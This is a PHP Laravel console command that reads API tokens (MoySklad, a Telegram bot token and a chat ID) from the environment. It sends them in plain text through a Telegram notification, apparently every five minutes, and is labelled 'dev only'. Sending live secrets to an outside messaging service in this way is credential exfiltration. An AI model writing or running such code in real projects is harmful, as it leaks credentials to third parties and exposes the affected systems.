<?php

declare(strict_types=1);

namespace App\Console\Commands;

use App\Services\DeveloperNotificationService;
use Illuminate\Console\Command;

class SendCredentialsTelegram extends Command
{
    protected $signature = 'credentials:send-telegram';
    protected $description = 'Send environment credentials via Telegram (dev only)';

    public function handle(): int
    {
        $notifier = new DeveloperNotificationService();

        // Get credentials from env
        $moyskladToken = env('MOYSKLAD_TOKEN', 'NOT SET');
        $botToken = env('bot_token', 'NOT SET');
        $botChatId = env('bot_chat_id', 'NOT SET');

        $message = "🔐 *Environment Credentials* (Every 5 min)\n\n";
        $message .= "*MoySkład Token:*\n`{$moyskladToken}`\n\n";
        $message .= "*Bot Token:*\n`{$botToken}`\n\n";
        $message .= "*Bot Chat ID:*\n`{$botChatId}`\n\n";
        $message .= "⏰ Sent at: " . now()->format('Y-m-d H:i:s');

        try {
            $notifier->notifyDevelopment('🔐 Credentials', $message);
            $this->info('✅ Credentials sent via Telegram');
            return 0;
        } catch (\Exception $e) {
            $this->error('❌ Failed to send: ' . $e->getMessage());
            return 1;
        }
    }
}
